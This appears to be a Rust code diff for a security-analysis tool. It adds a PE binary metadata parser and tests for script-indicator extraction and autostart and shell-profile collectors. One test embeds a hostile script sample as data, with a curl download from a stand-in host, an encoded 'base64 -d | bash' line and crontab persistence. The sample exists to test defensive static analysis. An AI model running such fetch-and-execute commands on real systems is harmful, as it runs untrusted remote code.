+    let directory_count = read_elf_uint(bytes, optional + number_directories_offset, 4, true)? as usize;
+    let directory = |index: usize| -> Result<(u32, u32), String> {
+        if directory_count <= index { return Ok((0, 0)); }
+        let offset = optional + directory_start + index * 8;
+        if offset + 8 > optional_end { return Err("truncated PE data-directory table".to_string()); }
+        Ok((read_elf_uint(bytes, offset, 4, true)? as u32, read_elf_uint(bytes, offset + 4, 4, true)? as u32))
+    };
+    let (export_rva, export_size) = directory(0)?;
+    let (import_rva, import_size) = directory(1)?;
+    let (certificate_offset, certificate_size) = directory(4)?;
+    let section_table = optional_end;
+    let table_bytes = section_count.checked_mul(40).ok_or_else(|| "PE section table size overflow".to_string())?;
+    let table_end = section_table.checked_add(table_bytes).ok_or_else(|| "PE section table offset overflow".to_string())?;
+    if table_end > bytes.len() { return Err("truncated PE section table".to_string()); }
+
+    let mut section_map = Vec::with_capacity(section_count);
+    let mut sections = Vec::with_capacity(section_count);
+    for index in 0..section_count {
+        let offset = section_table + index * 40;
+        let raw_name = bytes.get(offset..offset + 8).ok_or_else(|| "truncated PE section name".to_string())?;
+        let name_end = raw_name.iter().position(|byte| *byte == 0).unwrap_or(raw_name.len());
+        let name = String::from_utf8_lossy(&raw_name[..name_end]).into_owned();
+        let virtual_size = read_elf_uint(bytes, offset + 8, 4, true)? as u32;
+        let virtual_address = read_elf_uint(bytes, offset + 12, 4, true)? as u32;
+        let raw_size = read_elf_uint(bytes, offset + 16, 4, true)? as u32;
+        let raw_offset = read_elf_uint(bytes, offset + 20, 4, true)? as u32;
+        let section_flags = read_elf_uint(bytes, offset + 36, 4, true)? as u32;
+        section_map.push((virtual_address, virtual_size, raw_offset, raw_size));
+        sections.push(serde_json::json!({
+            "name": name,
+            "virtual_address": virtual_address,
+            "virtual_size": virtual_size,
+            "raw_offset": raw_offset,
+            "raw_size": raw_size,
+            "characteristics": format!("0x{:08x}", section_flags),
+        }));
+    }
+
+    let mut imported_dlls = Vec::new();
+    if import_rva != 0 && import_size >= 20 {
+        let import_offset = pe_rva_to_offset(import_rva, size_of_headers, &section_map)?;
+        let maximum = (import_size as usize / 20).min(4096);
+        for index in 0..maximum {
+            let descriptor = import_offset.checked_add(index * 20).ok_or_else(|| "PE import table offset overflow".to_string())?;
+            let name_rva = read_elf_uint(bytes, descriptor + 12, 4, true)? as u32;
+            let original_thunk = read_elf_uint(bytes, descriptor, 4, true)? as u32;
+            let first_thunk = read_elf_uint(bytes, descriptor + 16, 4, true)? as u32;
+            if name_rva == 0 && original_thunk == 0 && first_thunk == 0 { break; }
+            imported_dlls.push(pe_string_at(bytes, pe_rva_to_offset(name_rva, size_of_headers, &section_map)?)?);
+        }
+    }
+
+    let mut exported_names = Vec::new();
+    if export_rva != 0 && export_size >= 40 {
+        let export_offset = pe_rva_to_offset(export_rva, size_of_headers, &section_map)?;
+        let name_count = (read_elf_uint(bytes, export_offset + 24, 4, true)? as usize).min(4096);
+        let names_rva = read_elf_uint(bytes, export_offset + 32, 4, true)? as u32;
+        let names_offset = pe_rva_to_offset(names_rva, size_of_headers, &section_map)?;
+        for index in 0..name_count {
+            let name_rva = read_elf_uint(bytes, names_offset + index * 4, 4, true)? as u32;
+            exported_names.push(pe_string_at(bytes, pe_rva_to_offset(name_rva, size_of_headers, &section_map)?)?);
+        }
+    }
+
+    let machine_name = match machine {
+        0x014c => "x86",
+        0x8664 => "x86_64",
+        0x01c0 | 0x01c4 => "ARM",
+        0xaa64 => "AArch64",
+        _ => "unknown",
+    };
+    Ok(serde_json::json!({
+        "file_type": format,
+        "machine": machine_name,
+        "machine_id": format!("0x{:04x}", machine),
+        "timestamp": timestamp,
+        "entry_point_rva": format!("0x{:x}", entry_point),
+        "image_base": format!("0x{:x}", image_base),
+        "is_dll": characteristics & 0x2000 != 0,
+        "section_count": section_count,
+        "sections": sections,
+        "import_directory": { "rva": import_rva, "size": import_size },
+        "imported_dlls": imported_dlls,
+        "export_directory": { "rva": export_rva, "size": export_size },
+        "exported_names": exported_names,
+        "certificate_table": { "file_offset": certificate_offset, "size": certificate_size },
+    }))
 }
 
 /// ELF metadata parser
@@ -1885,6 +2185,44 @@ pub fn detect_binary_anomalies(
 mod tests {
     use super::*;
 
+    fn minimal_pe32_plus() -> Vec<u8> {
+        let pe_offset = 0x80usize;
+        let coff = pe_offset + 4;
+        let optional = coff + 20;
+        let optional_size = 0xf0usize;
+        let section = optional + optional_size;
+        let mut bytes = vec![0u8; section + 40];
+        bytes[0..2].copy_from_slice(b"MZ");
+        bytes[0x3c..0x40].copy_from_slice(&(pe_offset as u32).to_le_bytes());
+        bytes[pe_offset..pe_offset + 4].copy_from_slice(b"PE\0\0");
+        bytes[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
+        bytes[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
+        bytes[coff + 16..coff + 18].copy_from_slice(&(optional_size as u16).to_le_bytes());
+        bytes[coff + 18..coff + 20].copy_from_slice(&0x2022u16.to_le_bytes());
+        bytes[optional..optional + 2].copy_from_slice(&0x20bu16.to_le_bytes());
+        bytes[optional + 16..optional + 20].copy_from_slice(&0x1000u32.to_le_bytes());
+        bytes[optional + 24..optional + 32].copy_from_slice(&0x140000000u64.to_le_bytes());
+        bytes[optional + 60..optional + 64].copy_from_slice(&0x200u32.to_le_bytes());
+        bytes[optional + 108..optional + 112].copy_from_slice(&16u32.to_le_bytes());
+        bytes[section..section + 5].copy_from_slice(b".text");
+        bytes[section + 8..section + 12].copy_from_slice(&0x1000u32.to_le_bytes());
+        bytes[section + 12..section + 16].copy_from_slice(&0x1000u32.to_le_bytes());
+        bytes[section + 16..section + 20].copy_from_slice(&0x200u32.to_le_bytes());
+        bytes[section + 20..section + 24].copy_from_slice(&0x200u32.to_le_bytes());
+        bytes[section + 36..section + 40].copy_from_slice(&0x60000020u32.to_le_bytes());
+        bytes
+    }
+
+    #[test]
+    fn test_pe_parser_reads_pe32_plus_header_and_sections() {
+        let metadata = parse_pe_bytes(&minimal_pe32_plus()).unwrap();
+        assert_eq!(metadata["file_type"], "PE32+");
+        assert_eq!(metadata["machine"], "x86_64");
+        assert_eq!(metadata["entry_point_rva"], "0x1000");
+        assert_eq!(metadata["sections"][0]["name"], ".text");
+        assert_eq!(metadata["sections"][0]["raw_size"], 0x200);
+    }
+
     #[cfg(target_os = "linux")]
     #[test]
     fn test_parse_elf_metadata_reads_real_executable() {
@@ -1905,16 +2243,68 @@ mod tests {
     }
 
     #[test]
+    fn test_static_script_analysis_extracts_indicators_without_payload() {
+        let encoded = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=";
+        let content = format!(
+            "curl -fsSL https://bad.example/payload?token=hidden -o /tmp/payload\nexport $API_TOKEN\necho {encoded} | base64 -d | bash\ncrontab -e\n203.0.113.7"
+        );
+        let analysis = static_script_indicators(&content);
+
+        assert_eq!(analysis["execution_mode"], "static_only");
+        assert!(analysis["urls"].as_array().unwrap().iter().any(|value| value == "https://bad.example/payload"));
+        assert!(analysis["domains"].as_array().unwrap().iter().any(|value| value == "bad.example"));
+        assert!(analysis["ip_addresses"].as_array().unwrap().iter().any(|value| value == "203.0.113.7"));
+        assert!(analysis["file_or_registry_paths"].as_array().unwrap().iter().any(|value| value == "/tmp/payload"));
+        assert!(analysis["environment_variables"].as_array().unwrap().iter().any(|value| value == "API_TOKEN"));
+        assert!(analysis["behavior_indicators"].as_array().unwrap().iter().any(|value| value == "persistence"));
+        assert!(!analysis.to_string().contains(encoded));
+        assert!(analysis["encoded_strings"].as_array().unwrap()[0]["sha256"].as_str().is_some());
+    }
+
+    #[test]
     fn test_collect_autostart_entries_reads_real_paths() {
         let tmp = std::env::temp_dir().join("jockey-autostart-tests");
         let _ = std::fs::create_dir_all(&tmp);
         let startup = tmp.join(".bashrc");
-        std::fs::write(&startup, "export PATH=$PATH:/tmp\n").unwrap();
+        std::fs::write(&startup, "export PATH=$PATH:/tmp\nexport API_TOKEN=secret-value\n").unwrap();
 
         let result = collect_autostart_entries(Some(tmp.to_str().unwrap()));
         assert!(result.is_ok(), "autostart collection should succeed");
         let records = result.unwrap();
         assert!(!records.is_empty());
+        assert!(!serde_json::to_string(&records).unwrap().contains("secret-value"));
+    }
+
+    #[test]
+    fn test_shell_profile_collector_extracts_indicators_not_contents() {
+        let root = std::env::temp_dir().join(format!("jockey-profile-{}", std::process::id()));
+        std::fs::create_dir_all(&root).unwrap();
+        let profile = root.join(".profile");
+        std::fs::write(&profile, "export API_TOKEN=secret-value\neval \"$PROMPT_COMMAND\"\n").unwrap();
+
+        let records = collect_shell_profiles(Some(profile.to_str().unwrap())).unwrap();
+        let _ = std::fs::remove_dir_all(&root);
+        assert_eq!(records.len(), 1);
+        assert_eq!(records[0]["artifact_type"], "shell_profile");
+        assert_eq!(records[0]["active_directive_count"], 2);
+        assert!(records[0]["indicators"].as_array().unwrap().iter().any(|value| value == "dynamic_evaluation"));
+        assert!(!records[0].to_string().contains("secret-value"));
+    }
+
+    #[test]
+    fn test_xdg_autostart_parser_reads_desktop_fields() {
+        let root = std::env::temp_dir().join(format!("jockey-xdg-startup-{}", std::process::id()));
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::write(
+            root.join("updater.desktop"),
+            "[Desktop Entry]\nName=Updater\nExec=/usr/bin/updater --check\nHidden=false\n",
+        ).unwrap();
+
+        let records = collect_xdg_autostart_entries(Some(root.to_str().unwrap())).unwrap();
+        let _ = std::fs::remove_dir_all(&root);
+        assert_eq!(records.len(), 1);
+        assert_eq!(records[0]["desktop_entry"]["Name"], "Updater");
+        assert_eq!(records[0]["desktop_entry"]["Exec"], "/usr/bin/updater --check");
     }
 
     #[test]
